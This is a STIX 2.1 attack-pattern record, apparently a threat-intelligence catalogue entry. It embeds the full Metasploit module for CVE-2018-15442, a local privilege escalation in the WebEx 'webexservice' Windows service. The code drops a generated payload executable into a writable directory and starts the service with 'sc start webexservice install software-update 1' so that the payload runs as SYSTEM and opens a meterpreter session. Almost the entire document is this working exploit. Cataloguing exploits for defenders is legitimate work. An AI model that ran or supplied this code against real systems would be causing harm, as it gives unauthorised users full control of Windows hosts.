{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b0a8e6b1-0e00-4526-9400-de52abdd5008",
    "created": "2024-08-14T16:49:14.509342Z",
    "modified": "2024-08-14T16:49:14.509347Z",
    "name": "WebEx Local Service Permissions Exploit",
    "description": " This module exploits a flaw in the 'webexservice' Windows service, which runs as SYSTEM can be used to run arbitrary commands locally, and can be started by limited users in default installations.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/webexec.rb",
            "external_id": "webexec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15442"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Accounts\n\n  def initialize(info={})\n    super( update_info( info,\n      'Name'        => 'WebEx Local Service Permissions Exploit',\n      'Description' => %q{\n        This module exploits a flaw in the 'webexservice' Windows service, which runs as SYSTEM,\n        can be used to run arbitrary commands locally, and can be started by limited users in\n        default installations.\n      },\n      'References' =>\n        [\n          ['URL', 'https://webexec.org'],\n          ['CVE', '2018-15442']\n        ],\n      'DisclosureDate' => '2018-10-09',\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jeff McJunkin <jeff.mcjunkin[at]gmail.com>'\n        ],\n      'Platform'       => [ 'win'],\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'SessionTypes'   => [ \"meterpreter\" ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'WfsDelay' => 5,\n          'ReverseConnectRetries' => 255\n        },\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      OptString.new(\"DIR\", [ false, \"Specify a directory to plant the EXE.\", \"%SystemRoot%\\\\Temp\"])\n    ])\n    @service_name = 'webexservice'\n  end\n\n  def validate_arch\n    return target unless target.name == 'Automatic'\n\n    case sysinfo['Architecture']\n    when 'x86'\n      fail_with(Failure::BadConfig, 'Invalid payload architecture') if payload_instance.arch.first == 'x64'\n      vprint_status('Detected x86 system')\n      return targets[1]\n    when 'x64'\n      vprint_status('Detected x64 system')\n      return targets[2]\n    end\n  end\n\n  def check\n    unless service_exists?(@service_name)\n      return Exploit::CheckCode::Safe\n    end\n\n    srv_info = service_info(@service_name)\n\n    vprint_status(srv_info.to_s)\n\n    case START_TYPE[srv_info[:starttype]]\n    when 'Disabled'\n      vprint_error(\"Service startup is Disabled, so will be unable to exploit unless account has correct permissions...\")\n      return Exploit::CheckCode::Safe\n    when 'Manual'\n      vprint_error(\"Service startup is Manual, so will be unable to exploit unless account has correct permissions...\")\n      return Exploit::CheckCode::Safe\n    when 'Auto'\n      vprint_good(\"Service is set to Automatically start...\")\n    end\n\n    if check_search_path\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def check_write_access(path)\n    perm = check_dir_perms(path, @token)\n    if perm and perm.include?('W')\n      print_good(\"Write permissions in #{path} - #{perm}\")\n      return true\n    elsif perm\n      vprint_status (\"Permissions for #{path} - #{perm}\")\n    else\n      vprint_status (\"No permissions for #{path}\")\n    end\n\n    return false\n  end\n\n\n  def exploit\n    begin\n      @token = get_imperstoken\n    rescue Rex::Post::Meterpreter::RequestError\n      vprint_error(\"Error while using get_imperstoken: #{e}\")\n    end\n\n    fail_with(Failure::Unknown, \"Unable to retrieve token.\") unless @token\n\n    if is_system?\n      fail_with(Failure::Unknown, \"Current user is already SYSTEM, aborting.\")\n    end\n\n    print_status(\"Checking service exists...\")\n    if !service_exists?(@service_name)\n      fail_with(Failure::NoTarget, \"The service doesn't exist.\")\n    end\n\n    if is_uac_enabled?\n      print_warning(\"UAC is enabled, may get false negatives on writable folders.\")\n    end\n\n    # Use manually selected Dir\n    file_path = datastore['DIR']\n\n    @exe_file_name = Rex::Text.rand_text_alphanumeric(8)\n    @exe_file_path = \"#{file_path}\\\\#{@exe_file_name}.exe\"\n\n    service_information = service_info(@service_name)\n\n    # Check architecture\n    valid_arch = validate_arch\n    exe = generate_payload_exe(:arch => valid_arch.arch)\n\n    #\n    # Drop the malicious executable into the path\n    #\n    print_status(\"Writing #{exe.length.to_s} bytes to #{@exe_file_path}...\")\n    begin\n      write_file(@exe_file_path, exe)\n      register_file_for_cleanup(@exe_file_path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      # Can't write the file, can't go on\n      fail_with(Failure::Unknown, e.message)\n    end\n\n    #\n    # Run the service\n    #\n    print_status(\"Launching service...\")\n    res = cmd_exec(\"cmd.exe\",\n      \"/c sc start webexservice install software-update 1 #{@exe_file_path}\")\n\n    if service_restart(@service_name)\n      print_status(\"Service started...\")\n    else\n      service_information = service_info(@service_name)\n      if service_information[:starttype] == START_TYPE_AUTO\n        if job_id\n          print_status(\"Unable to start service, handler running waiting for a reboot...\")\n          while(true)\n            break if session_created?\n            select(nil,nil,nil,1)\n          end\n        else\n          fail_with(Failure::Unknown, \"Unable to start service, use exploit -j to run as a background job and wait for a reboot...\")\n        end\n      else\n        fail_with(Failure::Unknown, \"Unable to start service, and it does not auto start, cleaning up...\")\n      end\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-10-09",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}